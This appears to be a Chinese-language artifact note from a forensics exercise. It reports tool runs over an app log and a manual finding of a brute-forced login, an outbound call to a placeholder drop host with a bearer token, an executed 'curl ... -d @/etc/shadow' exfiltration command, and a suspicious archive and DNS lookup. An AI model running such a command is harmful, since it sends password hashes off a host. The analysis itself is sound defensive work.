# forensics02 产物说明

- 输入：`input/app.log`（sha256 `e0b0d9362a970a025c849f7be82cfa1dbeb516b24a304bf6dc58cd49876d0923`，619 B，8 行）。
- 运行 1：`python ../../../Tool/scripts/forensics-check.py --file input/app.log --json`，rc=0。工具将类型判为 `data/unknown`（confidence=unverified），只给出哈希/大小/文件 mtime 时间线与“类型未确认”警告；**未解析日志内容**。
- 运行 2（补充内容证据）：`grep -nE 'auth|outbound|exec|archive|dns' input/app.log`，rc=0，命中第 2–7 行。
- 人工结果：04:55:31Z/04:57:02Z 同一源 `198.51.100.23` 对 `svc-backup` 先失败 5 次后成功；04:58:44Z 外联 `https://drop.example.invalid/u/9f3a2c` 且带 `token=Bearer abc`；05:01:19Z 执行 `curl ... -d @/etc/shadow`；05:03:55Z 生成 `/tmp/.cache/9f3a.tar.gz`（248192 B）；05:06:10Z 查询 `telemetry.suspicious.invalid`。
- 边界：日志内 UTC 时间戳与文件 mtime（2026-10-21T12:38Z）不一致，未与主机/NTP 对齐；无进程树、pcap 或文件哈希佐证，日志可被伪造；未做归一化时间线与证据链闭环。
